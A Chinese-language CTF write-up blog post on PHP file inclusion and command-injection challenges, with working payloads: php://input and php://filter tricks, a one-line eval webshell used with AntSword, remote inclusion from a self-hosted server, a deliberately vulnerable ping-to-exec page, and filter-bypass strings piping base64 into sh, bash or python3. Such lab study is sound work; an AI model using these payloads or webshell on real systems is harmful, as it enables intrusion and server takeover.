+<h3 id="题目：php-input"><a href="#题目：php-input" class="headerlink" title="题目：php:&#x2F;&#x2F;input"></a>题目：php:&#x2F;&#x2F;input</h3><ul>
+<li>php:&#x2F;&#x2F;input 的作用<font style="color:rgb(77, 77, 77);">：</font><ul>
+<li><font style="color:rgb(77, 77, 77);">可用于查看源码，同时是要查看未压缩文件的只读流</font></li>
+<li><font style="color:rgb(77, 77, 77);">在post请求中能查看请求的原始数据，并将post请求中的post数据当作php代码执行。（只读流是说只能进行读操作的数据）</font><ul>
+<li><strong><font style="color:#DF2A3F;">条件：</font></strong><font style="color:rgb(77, 77, 77);">allow_url_fopen&#x3D;off&#x2F;on；allow_url_include&#x3D;on。</font></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/712640a679f1db43bae4d7e97f148738.png"></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/6209b28be1052c3e2017dc7cd582fdb2.png"></p>
+<p>php:&#x2F;&#x2F;input 代码执行风险</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/e48e488cf5583fef0eaa8eaa81dc7380.png"></p>
+<p>寻找目录</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/9040af0d06bc65d6f3b096d0e6496f0f.png"></p>
+<p>查看 flag</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/921bd42306419c8c9740881ff3d6602f.png"></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://input</span><br><span class="line">&lt;?php system(&quot;&quot;cat /flag<span class="emphasis">_20902);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="题目：读取源代码"><a href="#题目：读取源代码" class="headerlink" title="题目：读取源代码"></a>题目：读取源代码</h3><p>给了文件路径</p>
+<p>可以直接读文件</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=/flag</span><br><span class="line">/?file=php://filter/read/resource=/flag不加密读</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/a69817371218805a3e7d0e129917fdce.png"></p>
+<h3 id="题目：远程包含"><a href="#题目：远程包含" class="headerlink" title="题目：远程包含"></a>题目：远程包含</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1735526802877-2a64975c-3e94-458a-85fb-980756a4f890.png"></p>
+<p>可以直接包含远程文件，测试包含百度</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/10e8d2088fd6c08662109f597d393c76.png"></p>
+<p>包含自己博客</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/c41eeb7164eab732ec7a844867c9671c.png"></p>
+<p>一句话木马</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=array($<span class="emphasis">_REQUEST[&#x27;x&#x27;]=&gt;&quot;3&quot;);</span></span><br><span class="line"><span class="emphasis">$b=array_</span>keys($a)[0];</span><br><span class="line">eval($b);</span><br><span class="line">echo &#x27;123123&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>服务器开启 http 服务器<code>python3 -m http.server 8888</code></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/0154974c874431a68af142db4d3c9332.png"></p>
+<p>直接包含</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/1d03ab3db0b462b3d06b3b64638a8b2a.png"></p>
+<p>蚂蚁连接</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/ee7895c42b0cb9aa57d479663af9f74f.png"></p>
+<p>虚拟终端，查找 flag</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/23bf457dd4903a7a228df679bab2396f.png"></p>
+<h3 id="远程allow-url-fopen-include"><a href="#远程allow-url-fopen-include" class="headerlink" title="远程allow_url_fopen&#x2F;include"></a>远程allow_url_fopen&#x2F;include</h3><ul>
+<li><code>allow_url_fopen</code> 允许 url 的方式打开文件<ul>
+<li><code>file_get_contents()</code>、<code>fopen</code>、<code>php://input</code></li>
+</ul>
+</li>
+<li><code>allow_url_include</code>允许远程文件包含（远程服务器文件）<ul>
+<li><code>include</code>、<code>require</code>、<code>include_once</code>、<code>require_once</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="RCE-命令注入"><a href="#RCE-命令注入" class="headerlink" title="RCE_ 命令注入"></a>RCE_ 命令注入</h2><h3 id="题目：命令注入-exec-命令执行"><a href="#题目：命令注入-exec-命令执行" class="headerlink" title="题目：命令注入(exec 命令执行)"></a>题目：命令注入(exec 命令执行)</h3><ul>
+<li><code>|</code>是管道符，前一个命令输出，作为后一个命令输入<ul>
+<li>前一个命令对后一个命令如果没有有效的输入：会直接执行后一个命令</li>
+</ul>
+</li>
+<li><code>;</code>是直接分割命令，顺序执行这些命令<ul>
+<li><code>;</code>不管前一个是否执行成功，都会执行后一个</li>
+</ul>
+</li>
+<li><code>&amp;&amp;</code>是前一个执行成功，再执行后一个</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/57f780141ba15ed8f1d8f62745570af9.png"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$res = FALSE;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123; </span></span><br><span class="line"><span class="meta">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;  // 发送4个包</span></span><br><span class="line"><span class="meta">    exec($cmd, $res);  // 执行命令，返回结果给res</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 命令注入-无过滤<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 命令注入-无过滤<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span>  <span class="comment">&lt;!--#设置表单数据提交的URL为本页面--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;ip&quot;</span>&gt;</span>IP : <span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>  <span class="comment">&lt;!--标签IP关联到id值为id，可以点击IP跳转到输入框--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;ip&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ip&quot;</span>&gt;</span>  <span class="comment">&lt;!--设置输入文本框--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Ping&quot;</span>&gt;</span>  <span class="comment">&lt;!--提交按钮--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>  <span class="comment">&lt;!--展示ping命令的结果--&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">if ($res) &#123;</span></span><br><span class="line"><span class="meta">    print_r($res);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">show_source(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>exec 函数</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/57e7dc1be14387c7dd5f58ea39ef5a76.png"></p>
+<p>展示：exec 执行结果返回给$res，然后展示在页面上（print_r 格式化输出）</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/2ca8e4cb4b6e3bfc516e452685494fc0.png"></p>
+<ul>
+<li><strong><font style="color:#DF2A3F;">使用管道符</font></strong><code>**&lt;font style=&quot;color:#DF2A3F;&quot;&gt; | &lt;/font&gt;**</code><strong><font style="color:#DF2A3F;">连接多个命令</font></strong><ul>
+<li>前一个命令的输出，作为下一个命令的输入</li>
+<li>但是：因为 ping 不会产生有效输出——就会直接中断 ping 的执行然后<ul>
+<li>ls 命令就会直接执行</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/0b2f567d3f02e0ffac00deada35a4bce.png"></p>
+<p>直接 cat 看不 flag<code>www.baidu.com|cat 14645300762206.php</code></p>
+<p>但是 F12 查看源代码可以看到</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/4cfb1655012c61c7b2f57ee46f37b0fb.png"></p>
+<p>尝试 base64 编码<code>www.baidu.com|cat 14645300762206.php|base64</code></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/f86fc72290fcfb58bf8bd17f2f699f5a.png"></p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/fdbdccc0ff92216ea53757af58fab637.png"></p>
+<p>直接<code>;cat 14645300762206.php|base64</code>也可以</p>
+<p><img src="https://raw.githubusercontent.com/godicee/img/main/46f20236961707420b64e456768c818e.png"></p>
+<h3 id="题目：禁用-cat"><a href="#题目：禁用-cat" class="headerlink" title="题目：禁用 cat"></a>题目：禁用 cat</h3><p><font style="color:rgb(0, 0, 0);">less（更多交互）、more（只允许向后）、tac（最后一行开始反向显示）、ca\t（被解析为 cat+\t 制表符）</font></p>
+<p><code>;ca\t flag_18071273756181.php|base64</code>然后解码</p>
+<p><code>;ca\t flag_18071273756181.php</code>然后查看源代码</p>
+<h3 id="题目：禁用空格"><a href="#题目：禁用空格" class="headerlink" title="题目：禁用空格"></a>题目：禁用空格</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.php&#125;  </span><br><span class="line">cat$&#123;IFS&#125;flag.php  </span><br><span class="line">cat$IFS$9flag.php</span><br><span class="line">cat<span class="tag">&lt;<span class="name">flag.php</span></span></span><br><span class="line"><span class="tag"><span class="attr">cat</span>&lt;&gt;</span>flag.php</span><br><span class="line">kg=$&#x27;\x20flag.php&#x27;&amp;&amp;cat$kg</span><br><span class="line">a=c;b=at;c=flag.php;$a$b $c</span><br><span class="line">b=ag;a=fl;cat$IFS$1$a$b.php</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span><br><span class="line">echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>1<code>&#123;cat,flag.php&#125;</code>大括号扩展：生成一个逗号分割的字符串集合<ul>
+<li>会分别执行 cat flag.php</li>
+</ul>
+</li>
+<li>2<code>cat$&#123;IFS&#125;flag.php</code>内部字段分隔符 IFS：相当于空格、制表、换行</li>
+<li>3<code>cat$IFS$9flag.php</code>$9 是第 9 个参数</li>
+<li>4<code>cat&lt;flag.php</code>flag.php 重定向为 cat 的输入</li>
+<li>5<code>cat&lt;&gt;flag.php</code>读取并写入 flag.php<ul>
+<li>其实等于 4，读取再写入</li>
+</ul>
+</li>
+<li>6<code>kg=$&#39;\x20flag.php&#39;&amp;&amp;cat$kg</code>定义<code>kg=$&#39;\x20flag.php&#39;</code>其中 \x20 是 ASCII 中的空格<ul>
+<li>直接定义访问了</li>
+</ul>
+</li>
+<li>7<code>a=c;b=at;c=flag.php;$a$b $c</code>定义表达式访问<ul>
+<li><code>a=ca;b=$&#39;t\x20&#39;;c=flag.php;$a$b$c</code>也可以</li>
+</ul>
+</li>
+<li>8<code>b=ag;a=fl;cat$IFS$1$a$b.php</code>定义表达式+内部字段分割符</li>
+<li>9</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer"><div class="post-widgets">
+      <div id="needsharebutton-postbottom">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    </div>
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>原作者： </strong>godice
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://godice.top/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html" title="CTF_Show_RCE技能树">http://godice.top/CTF_Show_RCE技能树.html</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/ctf_hub.html" rel="prev" title="ctf_hub">
+                  <i class="fa fa-angle-left"></i> ctf_hub
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/%E5%9F%BA%E7%A1%80%E9%98%B6%E6%AE%B5.html" rel="next" title="基础阶段">
+                  基础阶段 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="waline"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Godice</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">19k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:07</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: inline !important;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: inline !important;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("12/13/2024 00:00:00"); // 在此处修改你的建站时间
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; 
+        dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); 
+        hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} 
+        minutes = (now - grt ) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); 
+        if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "已运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+    setInterval("createtime()",250);
+</script>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"comments-eta-ten.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"请文明评论呀","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":[],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html"}</script>
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
+    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
+  ).then(() => 
+    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
+  );
+});
+</script>
+
+  <script src="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.js"></script>
+  <script>
+      pbOptions = {};
+        pbOptions.iconStyle = "box";
+        pbOptions.boxForm = "horizontal";
+        pbOptions.position = "bottomCenter";
+        pbOptions.networks = "Wechat,QQZone,Weibo,Douban,Twitter,Facebook";
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+  </script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/heart.js"></script>
+
+<a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/godicee/godicee.github.io" class="github-corner" aria-label="View source on GitHub">
+  <svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
+    <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/>
+    <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/>
+    <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/>
+  </svg>
+</a>
+
+<style>
+  .github-corner:hover .octo-arm {
+    animation: octocat-wave 560ms ease-in-out
+  }
+  @keyframes octocat-wave {
+    0%, 100% { transform: rotate(0) }
+    20%, 60% { transform: rotate(-25deg) }
+    40%, 80% { transform: rotate(10deg) }
+  }
+  @media (max-width: 500px) {
+    .github-corner:hover .octo-arm { animation: none }
+    .github-corner .octo-arm { animation: octocat-wave 560ms ease-in-out }
+  }
+</style>
+
+</html>
